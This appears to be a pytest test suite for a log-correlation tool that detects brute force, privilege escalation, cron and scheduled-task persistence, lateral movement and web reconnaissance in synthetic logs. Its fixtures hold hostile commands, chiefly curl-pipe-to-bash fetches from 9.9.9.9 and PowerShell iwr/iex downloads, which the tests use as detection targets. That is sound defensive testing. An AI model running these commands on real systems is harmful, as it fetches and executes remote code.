import importlib.util
import itertools
import json
import shutil
from dataclasses import replace
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from evidenceweave import cli
from evidenceweave import schema as S
from evidenceweave.correlation.chain import build_chain
from evidenceweave.correlation.config import CorrelationConfig
from evidenceweave.correlation.engine import correlate, correlate_case
from evidenceweave.correlation.findings import Finding
from evidenceweave.correlation.rules import (brute_force, initial_access, lateral_movement, persistence,
                                             privilege_escalation, web_recon)
from evidenceweave.generator.core import generate
from evidenceweave.parsers.pipeline import parse_case
from evidenceweave.schema import Event

_spec = importlib.util.spec_from_file_location("check_key", Path(__file__).parent.parent / "scripts" / "check_against_key.py")
check_key = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check_key)

T0 = datetime(2026, 10, 27, 2, 0, tzinfo=timezone.utc)
PFX = {"auth": "AUTH", "nginx": "NGX", "windows": "WIN"}
LINE = itertools.count(1)
HOSTS = {"web01": {"name": "web01", "ip": "10.0.0.5", "os": "linux", "role": "web"},
         "ws1": {"name": "ws1", "ip": "10.0.0.70", "os": "windows", "role": "workstation"}}
CFG = CorrelationConfig()


def ev(src, action, t, host="web01", user=None, ip=None, **extra):
    n = next(LINE)
    ts = T0 + timedelta(seconds=t)
    return Event(f"{PFX[src]}-L{n}", ts, ts, False, host, user, ip, None, src, action, "f", n, "x", extra)


def fails(n, ip="9.9.9.9", t0=0, step=5, action=S.SSH_LOGIN_FAILED):
    return [ev("auth", action, t0 + i * step, user=f"u{i % 3}", ip=ip, port=22) for i in range(n)]


def ssh_ok(t, user="deploy", ip="9.9.9.9", host="web01"):
    return ev("auth", S.SSH_LOGIN_SUCCESS, t, host=host, user=user, ip=ip, method="password")


def sudo(t, user, cmd, host="web01"):
    return ev("auth", S.SUDO_COMMAND, t, host=host, user=user, command=cmd)


def pipeline(events, hosts=HOSTS, cfg=CFG):
    out = []
    for r in (brute_force, initial_access, privilege_escalation, lateral_movement, persistence, web_recon):
        out += r.run(events, cfg, hosts, tuple(out))
    return out


def stages(fs):
    return [f.stage for f in fs]


# ---------- 1. rule units ----------
def test_brute_force_threshold_and_config():
    assert brute_force.run(fails(7), CFG, HOSTS) == []
    (f,) = brute_force.run(fails(8), CFG, HOSTS)
    assert f.status == "attempts_only" and f.details["failure_count"] == 8 and f.entities["ips"] == ["9.9.9.9"]
    assert len(brute_force.run(fails(7), replace(CFG, brute_force_min_failures=7), HOSTS)) == 1
    assert len(brute_force.run(fails(10, action=S.SSH_INVALID_USER), CFG, HOSTS)) == 1


def test_brute_force_window_and_separate_bursts():
    slow = fails(8, step=100)  # 8 failures over 700s, never 8 inside 600s
    assert brute_force.run(slow, CFG, HOSTS) == []
    assert len(brute_force.run(slow, replace(CFG, brute_force_window_seconds=800), HOSTS)) == 1
    two = fails(8) + fails(8, t0=5000)
    assert len(brute_force.run(two, CFG, HOSTS)) == 2
    assert len(brute_force.run(fails(8) + fails(8, ip="8.8.8.8"), CFG, HOSTS)) == 2


def test_brute_force_confirmed_when_success_follows():
    (f,) = brute_force.run(fails(8) + [ssh_ok(100)], CFG, HOSTS)
    assert f.status == "confirmed" and f.details["succeeded"]


def test_initial_access_fires_and_near_misses():
    base = fails(10)
    (f,) = pipeline(base + [ssh_ok(60)])[1:2]
    assert f.stage == "initial_access" and f.entities["users"] == ["deploy"] and f.details["linked_brute_force"]
    assert "initial_access" not in stages(pipeline(base + [ssh_ok(60, ip="1.1.1.1")]))  # other IP
    assert "initial_access" not in stages(pipeline(base + [ssh_ok(45 + 1900)]))  # outside the window
    late = pipeline(base + [ssh_ok(45 + 1900)], cfg=replace(CFG, access_after_failures_window_seconds=2000))
    assert "initial_access" in stages(late)
    assert "initial_access" not in stages(pipeline(fails(7) + [ssh_ok(60)]))  # brute force never reached


def test_benign_user_typos_create_nothing():
    evs = (fails(3, ip="10.0.0.22") + [ssh_ok(30, user="alice", ip="10.0.0.22")])
    assert pipeline(evs) == []


def test_privilege_escalation():
    access = fails(10) + [ssh_ok(60)]
    bad = sudo(120, "deploy", "/bin/bash -c 'curl -s http://9.9.9.9:8080/x.sh | bash'")
    fs = pipeline(access + [bad])
    (pe,) = [f for f in fs if f.stage == "privilege_escalation"]
    assert pe.status == "confirmed" and pe.entities["urls"] == ["http://9.9.9.9:8080/x.sh"] and pe.entities["ips"] == ["9.9.9.9"]
    # plain admin sudo by someone else, and a harmless command by an unrelated user: no finding
    quiet = [sudo(120, "alice", "/usr/bin/apt update"), sudo(130, "carol", "/usr/bin/systemctl status nginx")]
    assert "privilege_escalation" not in stages(pipeline(access + quiet))
    # compromised user, harmless command, soon after access -> partial; long after -> nothing
    soon = [f for f in pipeline(access + [sudo(120, "deploy", "/usr/bin/apt update")]) if f.stage == "privilege_escalation"]
    assert [f.status for f in soon] == ["partial"]
    assert "privilege_escalation" not in stages(pipeline(access + [sudo(60 + 5000, "deploy", "/usr/bin/apt update")]))
    # suspicious pattern by an uncompromised user without any URL: not flagged
    assert "privilege_escalation" not in stages(pipeline([sudo(10, "alice", "bash -c 'cat x | bash'")]))


def cron(t, user, cmd, pid, host="web01"):
    return [ev("auth", S.CRON_SESSION_OPENED, t, host=host, user=user, pid=pid),
            ev("auth", S.CRON_COMMAND, t, host=host, user=user, pid=pid, command=cmd),
            ev("auth", S.CRON_SESSION_CLOSED, t, host=host, user=user, pid=pid)]


def test_persistence_cron_grouping_and_missing_account():
    access = fails(10) + [ssh_ok(60)]
    cmd = "curl -s http://9.9.9.9:8080/b.sh | bash"
    runs = [e for i in range(4) for e in cron(200 + 300 * i, "svc", cmd, 5000 + i)]
    noise = cron(0, "root", "/usr/local/bin/healthcheck.sh", 1000) + cron(3, "www-data", "cd / && run-parts /etc/cron.hourly", 1001)
    fs = persistence.run(access + runs + noise, CFG, HOSTS, tuple(pipeline(access)))
    cr = [f for f in fs if f.details.get("kind") == "cron"]
    assert len(cr) == 1 and cr[0].details["executions"] == 4 and len(cr[0].evidence_event_ids) == 12
    (miss,) = [f for f in fs if f.stage == "missing_evidence"]
    assert miss.status == "unprovable" and miss.entities["users"] == ["svc"]
    # account creation present -> no missing_evidence, and the creation itself is persistence
    made = ev("auth", S.USER_CREATED, 150, user="svc", new_user="svc")
    fs2 = persistence.run(access + runs + [made], CFG, HOSTS, tuple(pipeline(access)))
    assert "missing_evidence" not in stages(fs2) and "user_created" in [f.details["kind"] for f in fs2]


def test_persistence_preexisting_user_not_reported_missing():
    access = fails(10) + [ssh_ok(600)]
    early = cron(0, "backup", "curl -s http://8.8.8.8/x.sh | sh", 1)  # runs before the compromise
    fs = persistence.run(access + early + cron(1000, "backup", "curl -s http://8.8.8.8/x.sh | sh", 2), CFG, HOSTS,
                         tuple(pipeline(access)))
    assert "missing_evidence" not in stages(fs)


def test_persistence_user_created_before_access_ignored_and_task_rules():
    access = fails(10) + [ssh_ok(600)]
    before = ev("auth", S.USER_CREATED, 10, user="old", new_user="old")
    assert persistence.run(access + [before], CFG, HOSTS, tuple(pipeline(access))) == []
    ok = ev("windows", S.WIN_TASK_CREATED, 900, host="ws1", user="x", TaskName="\\a",
            TaskContent="powershell -NoP -W Hidden -c iwr http://9.9.9.9/w.ps1")
    benign = ev("windows", S.WIN_TASK_CREATED, 910, host="ws1", user="admin", TaskName="\\Google",
                TaskContent="C:\\Program Files\\Google\\Update\\GoogleUpdate.exe /c")
    fs = persistence.run([ok, benign], CFG, HOSTS, ())
    assert [f.details["task_name"] for f in fs] == ["\\a"]


def lateral_events(logon_ip="10.0.0.5", t=1000):
    w = lambda a, tt, **k: ev("windows", a, tt, host="ws1", **k)
    return [w(S.WIN_LOGON_FAILED, t - 20, user="svc", ip=logon_ip), w(S.WIN_LOGON_FAILED, t - 10, user="svc", ip=logon_ip),
            w(S.WIN_LOGON_SUCCESS, t, user="svc", ip=logon_ip, LogonType="3"),
            w(S.WIN_SPECIAL_PRIVILEGES, t, user="svc"),
            w(S.WIN_PROCESS_CREATED, t + 30, user="svc", CommandLine="powershell.exe -NoP -W Hidden -Enc AAAA"),
            w(S.WIN_PROCESS_CREATED, t + 40, user="svc", CommandLine="notepad.exe"),
            w(S.WIN_TASK_CREATED, t + 50, user="svc", TaskName="\\T", TaskContent="iex http://9.9.9.9/w"),
            w(S.WIN_SPECIAL_PRIVILEGES, t + 60, user="other")]


def test_lateral_movement():
    access = fails(10) + [ssh_ok(60)]
    evs = access + lateral_events()
    (lm,) = [f for f in pipeline(evs) if f.stage == "lateral_movement"]
    assert lm.details["pivot_host"] == "web01" and lm.details["failed_logons_before"] == 2
    assert len(lm.evidence_event_ids) == 2 + 1 + 1 + 1 + 1  # 2 failures, logon, 4672, 4688(enc), 4698; not notepad/other user
    assert lm.entities["hosts"] == ["web01", "ws1"]
    # near misses: logon from a non-pivot IP; window too short; earlier than the compromise beyond tolerance
    assert "lateral_movement" not in stages(pipeline(access + lateral_events(logon_ip="10.0.0.33")))
    short = [f for f in pipeline(evs, cfg=replace(CFG, lateral_window_seconds=5)) if f.stage == "lateral_movement"]
    assert short and short[0].details["suspicious_processes"] == 0
    assert "lateral_movement" not in stages(pipeline(access + lateral_events(t=60 - 600)))
    assert "lateral_movement" in stages(pipeline(access + lateral_events(t=60 - 600), cfg=replace(CFG, cross_host_tolerance_seconds=900)))


def test_lateral_without_inventory_is_candidate_with_note():
    fs = pipeline(fails(10) + [ssh_ok(60)] + lateral_events(), hosts={})
    (lm,) = [f for f in fs if f.stage == "lateral_movement"]
    assert lm.status == "partial" and "inventory" in lm.details["note"]
    assert "lateral_movement" not in stages(pipeline(lateral_events()[:4], hosts={}))  # no suspicious follow-up


def web(n, status=404, path=None, ip="7.7.7.7", step=2, t0=0):
    return [ev("nginx", S.WEB_REQUEST, t0 + i * step, ip=ip, method="GET", path=path or f"/p{i}", status=status)
            for i in range(n)]


def test_web_recon_thresholds():
    assert web_recon.run(web(14), CFG, HOSTS) == []
    (f,) = web_recon.run(web(15), CFG, HOSTS)
    assert f.status == "attempts_only" and f.details["signals"] == ["request_rate_and_errors"]
    assert web_recon.run(web(15, status=200), CFG, HOSTS) == []  # many requests but no errors
    mixed = web(10) + web(10, status=200, t0=50)  # 50% errors < 0.6
    assert web_recon.run(mixed, CFG, HOSTS) == []
    assert len(web_recon.run(mixed, replace(CFG, web_recon_min_error_ratio=0.5), HOSTS)) == 1
    assert len(web_recon.run(web(14), replace(CFG, web_recon_min_requests=10), HOSTS)) == 1
    assert web_recon.run(web(30, step=100), CFG, HOSTS) == []  # too slow for the window


def test_web_recon_sensitive_paths_signal():
    paths = ["/.env", "/wp-admin/", "/phpmyadmin/"]
    mk = lambda ps: [ev("nginx", S.WEB_REQUEST, i, ip="7.7.7.7", method="GET", path=p, status=200) for i, p in enumerate(ps)]
    (f,) = web_recon.run(mk(paths), CFG, HOSTS)
    assert f.details["signals"] == ["sensitive_paths"]
    assert web_recon.run(mk(paths[:2]), CFG, HOSTS) == []
    assert web_recon.run(mk(["/", "/index.html", "/about"] * 5), CFG, HOSTS) == []


# ---------- 3. chain builder units ----------
def finding(fid, stage, t, ips=(), users=(), hosts=(), urls=(), status="confirmed", **details):
    ts = T0 + timedelta(seconds=t)
    ents = {"ips": sorted(ips), "users": sorted(users), "hosts": sorted(hosts), "urls": sorted(urls)}
    return Finding(fid, fid.split("-")[1], stage, status, ts, ts + timedelta(seconds=5), sorted(hosts), ents,
                   [f"AUTH-L{abs(hash(fid)) % 9000 + 1}"], f"summary {fid}", details)


def chain_of(fs, hosts=HOSTS):
    return build_chain(fs, hosts, CFG, "t", {}, {"events_read": 0, "unparsed_skipped": 0, "findings_per_rule": {}})[0]


def test_chain_links_via_ip_url_and_pivot_and_isolates_decoy():
    fs = [finding("F-brute_force-1", "brute_force", 0, ips=["9.9.9.9"], hosts=["web01"]),
          finding("F-initial_access-1", "initial_access", 100, ips=["9.9.9.9"], users=["deploy"], hosts=["web01"],
                  linked_brute_force="F-brute_force-1"),
          finding("F-privilege_escalation-1", "privilege_escalation", 200, ips=["5.5.5.5"], users=["deploy"],
                  hosts=["web01"], urls=["http://5.5.5.5:80/x.sh"]),
          finding("F-persistence-1", "persistence", 300, ips=["5.5.5.5"], users=["svc"], hosts=["web01"],
                  urls=["http://5.5.5.5:80/b.sh"]),
          finding("F-lateral_movement-1", "lateral_movement", 400, ips=["10.0.0.5"], users=["other"],
                  hosts=["web01", "ws1"], pivot_host="web01"),
          finding("F-brute_force-2", "brute_force", 10, ips=["6.6.6.6"], hosts=["web01"], status="attempts_only"),
          finding("F-web_recon-1", "web_recon", 20, ips=["6.6.6.6"], hosts=["web01"], status="attempts_only"),
          finding("F-web_recon-2", "web_recon", 500, ips=["9.9.9.9"], hosts=["web01"], status="attempts_only")]
    ch = chain_of(fs)
    by = {s["stage"]: s for s in ch["stages"]}
    reasons = lambda st, fid: next(l["reasons"] for l in by[st]["links"] if l["finding_id"] == fid)
    assert any("shares IP 9.9.9.9" in r for r in reasons("brute_force", "F-brute_force-1"))
    assert any("payload server http://5.5.5.5:80" in r for r in reasons("persistence", "F-persistence-1"))
    assert any("pivot host web01 = 10.0.0.5" in r for r in reasons("lateral_movement", "F-lateral_movement-1"))
    assert by["web_recon"]["status"] == "confirmed"
    assert ch["attacker_entities"]["ips"] == ["5.5.5.5", "9.9.9.9"]
    assert [a["ip"] for a in ch["attempts_only_actors"]] == ["6.6.6.6"]
    assert "No successful access" in ch["attempts_only_actors"][0]["statement"]
    assert not any("6.6.6.6" in json.dumps(s) for s in ch["stages"])
    # no inventory: lateral is never linked
    ch2 = chain_of(fs, hosts={})
    assert "lateral_movement" not in [s["stage"] for s in ch2["stages"]]
    assert ch2["unlinked_findings"][0]["finding_id"] == "F-lateral_movement-1"


def test_chain_time_order_check_and_missing_evidence_makes_stage_partial():
    ia = finding("F-initial_access-1", "initial_access", 1000, ips=["9.9.9.9"], users=["deploy"], hosts=["web01"],
                 linked_brute_force="x")
    early = finding("F-persistence-1", "persistence", 100, users=["deploy"], hosts=["web01"])
    miss = finding("F-persistence-2", "missing_evidence", 1100, users=["deploy"], hosts=["web01"], status="unprovable",
                   affects_stage="persistence")
    ch = chain_of([ia, early, miss])
    assert [u["finding_id"] for u in ch["unlinked_findings"]] == ["F-persistence-1"]
    assert "before initial access" in ch["unlinked_findings"][0]["reason"]
    assert ch["stages"][-1]["stage"] == "persistence" and ch["stages"][-1]["status"] == "partial"
    assert ch["unprovable_items"][0]["attached_to_chain"]


# ---------- integration on generated cases ----------
ROBUST = [(s, d) for s in (1, 2, 3) for d in ("easy", "hard")]


@pytest.fixture(scope="module")
def root(tmp_path_factory):
    r = tmp_path_factory.mktemp("cases")
    generate("case01", "easy", 42, r)
    generate("case02", "hard", 7, r)
    for s, d in ROBUST:
        generate(f"s{s}{d}", d, s, r)
    return r


def key_of(d):
    return json.loads((d / "answer_key.json").read_text())


@pytest.mark.parametrize("name", ["case01", "case02"])
def test_integration_chain(root, name):
    d = root / name
    key = key_of(d)
    case, findings, chain = correlate_case(d)
    assert [s["stage"] for s in chain["stages"]] == [s["name"] for s in key["steps"]]
    starts = [s["start_time"] for s in chain["stages"]]
    assert starts == sorted(starts)
    ae = chain["attacker_entities"]
    assert ae["ips"] == [key["attacker_ip"]] and ae["users"] == [key["compromised_user"]]
    assert key["created_user"] in ae["associated_users"]
    if key["decoy_ips"]:
        assert [a["ip"] for a in chain["attempts_only_actors"]] == key["decoy_ips"]
        assert not any(key["decoy_ips"][0] in json.dumps(s["links"]) for s in chain["stages"])
    assert chain["stats"]["unparsed_skipped"] == 0
    persistence_stage = next(s for s in chain["stages"] if s["stage"] == "persistence")
    if name == "case02":
        (u,) = chain["unprovable_items"]
        assert u["users"] == [key["created_user"]] and persistence_stage["status"] == "partial"
    else:
        assert chain["unprovable_items"] == [] and persistence_stage["status"] == "confirmed"


@pytest.mark.parametrize("seed,difficulty", ROBUST)
def test_robust_across_seeds(root, seed, difficulty):
    d = root / f"s{seed}{difficulty}"
    _, _, chain = correlate_case(d)
    (d / "chain.json").write_text(json.dumps(chain))
    r = check_key.check(d, d / "chain.json")
    for row in r["rows"]:
        assert row["recall"] >= 0.9, (row["name"], row["fn"])
    assert r["decoy_hits"] == [] and r["benign_hits"] == []
    assert r["persistence_partial"] == r["missing_expected"] == r["missing_detected"]


def test_analysis_never_reads_key(root, tmp_path):
    src = root / "case02"
    with_key = tmp_path / "a" / "case02"
    without = tmp_path / "b" / "case02"
    shutil.copytree(src, with_key)
    shutil.copytree(src, without)
    (without / "answer_key.json").unlink()
    (without / "manifest.json").unlink()
    cli.main(["correlate", "--case-dir", str(with_key), "--out", str(tmp_path / "oa"), "--year", "2026"])
    cli.main(["correlate", "--case-dir", str(without), "--out", str(tmp_path / "ob"), "--year", "2026"])
    for f in ("chain.json", "findings.json"):
        assert (tmp_path / "oa" / "case02" / f).read_bytes() == (tmp_path / "ob" / "case02" / f).read_bytes()


def test_analysis_source_never_mentions_key():
    pkg = Path(__file__).parent.parent / "evidenceweave"
    for p in list((pkg / "correlation").rglob("*.py")):
        text = p.read_text(encoding="utf-8")
        assert "answer_key" not in text and "manifest" not in text, p


def test_determinism(root, tmp_path):
    for i in (1, 2):
        cli.main(["correlate", "--case-dir", str(root / "case02"), "--out", str(tmp_path / str(i))])
    for f in ("chain.json", "findings.json"):
        assert (tmp_path / "1" / "case02" / f).read_bytes() == (tmp_path / "2" / "case02" / f).read_bytes()


def test_without_hosts_json(root, tmp_path):
    d = tmp_path / "case02"
    shutil.copytree(root / "case02", d)
    (d / "hosts.json").unlink()
    _, findings, chain = correlate_case(d)
    assert "lateral_movement" not in [s["stage"] for s in chain["stages"]]
    lm = [f for f in findings if f.stage == "lateral_movement"]
    assert len(lm) == 1 and "inventory" in lm[0].details["note"]
    assert any(u["finding_id"] == lm[0].finding_id for u in chain["unlinked_findings"])
    assert any("inventory" in n for n in chain["notes"])
    assert len(chain["stages"]) == 5


def test_clock_offset_chain_complete_both_ways(root):
    d = root / "case02"
    for offsets in ({}, {"ws-fin01": 90}):
        _, _, chain = correlate_case(d, clock_offsets=offsets)
        assert [s["stage"] for s in chain["stages"]] == [s["name"] for s in key_of(d)["steps"]]
        assert chain["applied_clock_offsets"] == offsets
    _, _, c0 = correlate_case(d)
    _, _, c1 = correlate_case(d, clock_offsets={"ws-fin01": 90})
    ev0 = {s["stage"]: s["evidence_event_ids"] for s in c0["stages"]}
    ev1 = {s["stage"]: s["evidence_event_ids"] for s in c1["stages"]}
    assert ev0 == ev1


def test_tolerance_decides_whether_a_fast_clock_stays_linked(root):
    """ws-fin01 clock 40 min fast (offset 2400): corrected lateral events land ~12 min BEFORE the compromise."""
    d = root / "case02"
    off = {"ws-fin01": 2400}
    _, _, tight = correlate_case(d, replace(CFG, cross_host_tolerance_seconds=0), clock_offsets=off)
    _, _, loose = correlate_case(d, replace(CFG, cross_host_tolerance_seconds=900), clock_offsets=off)
    assert "lateral_movement" not in [s["stage"] for s in tight["stages"]]
    assert "lateral_movement" in [s["stage"] for s in loose["stages"]]


def test_unparsed_events_are_skipped_and_counted(root):
    case = parse_case(root / "case02")
    first = correlate(case)[1]["attacker_entities"]["ips"][0]
    junk = Event("AUTH-L99999", datetime(1970, 1, 1, tzinfo=timezone.utc), datetime(1970, 1, 1, tzinfo=timezone.utc),
                 False, "web01", "deploy", first, None, "auth", S.UNPARSED, "linux_auth.log", 99999,
                 f"junk from {first}", {"reason": "test"})
    case.events.append(junk)
    findings, chain = correlate(case)
    assert chain["stats"]["unparsed_skipped"] == 1
    assert all("AUTH-L99999" not in f.evidence_event_ids for f in findings)
    assert all(junk.event_id not in s["evidence_event_ids"] for s in chain["stages"])
    assert min(f.start_time for f in findings).year == 2026


def test_cli_overrides_and_findings_roundtrip(root, tmp_path):
    cli.main(["correlate", "--case-dir", str(root / "case01"), "--out", str(tmp_path), "--tolerance-seconds", "10",
              "--brute-force-min-failures", "1000"])
    chain = json.loads((tmp_path / "case01" / "chain.json").read_text())
    assert chain["config"]["cross_host_tolerance_seconds"] == 10 and chain["stages"] == []
    fs = json.loads((tmp_path / "case01" / "findings.json").read_text())["findings"]
    assert all(Finding.from_dict(f).to_dict() == f for f in fs) and fs
